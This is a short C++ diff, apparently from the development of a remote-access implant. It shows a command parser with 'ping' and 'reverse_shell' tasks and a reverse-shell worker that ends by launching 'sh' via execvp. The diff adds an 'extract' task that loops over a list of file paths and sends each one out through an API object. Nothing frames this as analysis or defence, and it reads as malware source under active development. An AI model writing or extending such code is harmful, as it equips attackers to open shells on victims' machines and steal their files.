@@ -4,9 +4,11 @@
 #include <thread>
 
 
+/* Refactor to hashmap */
 std::unique_ptr<Task> parse_task_from_string(std::string name) {
     if (name == "ping") return std::make_unique<PingTask>();
     if (name == "reverse_shell") return std::make_unique<ReverseShellTask>();
+    if (name == "extract") return std::make_unique<ExtractTask>();
     return std::make_unique<InvalidTask>();
 }
 
@@ -48,4 +50,12 @@ void ReverseShellTask::worker() {
 
     char * const argv[] = {"sh", NULL};
     execvp("sh", argv);
+}
+
+void ExtractTask::run() {
+    Api api = Api::get_instance();
+
+    for (auto& file_path: file_to_extract) {
+        api.send_file(file_path);
+    }
 }
